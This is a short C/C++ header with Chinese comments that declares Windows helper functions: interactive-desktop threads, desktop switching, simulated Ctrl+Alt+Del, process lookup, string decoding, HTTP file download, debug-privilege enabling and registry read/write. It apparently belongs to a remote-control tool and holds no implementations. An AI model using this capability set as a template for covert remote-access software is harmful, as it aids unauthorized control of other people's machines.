#pragma once
#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED

typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;
unsigned int __stdcall ThreadLoader(LPVOID param);

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId,
					   bool bInteractive = false);

//bool SwitchInputDesktop();
DWORD GetProcessID(LPCTSTR lpProcessName);
BOOL SelectDesktop(TCHAR *name);
BOOL SelectHDESK(HDESK new_desktop);
BOOL SimulateCtrlAltDel();
BOOL EnumProcesin(LPTSTR lpProcessName);
char* MyDecode(char *data,int len);
BOOL CheckFileExist(LPCTSTR lpszPath);
bool http_get(LPCTSTR szURL, LPCTSTR szFileName);
BOOL DebugPrivilege(const char *PName,BOOL bEnable);
int WriteToLog(char* str);
//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键 2-牧举指定键项 3-判断该键是否存在)
int ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode);
//写注册表的指定键的数据(Mode:0-新建键数据 1-设置键数据 2-删除指定键 3-删除指定键项)
int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode);
#endif // !defined(AFX_UNTIL_H_INCLUDED)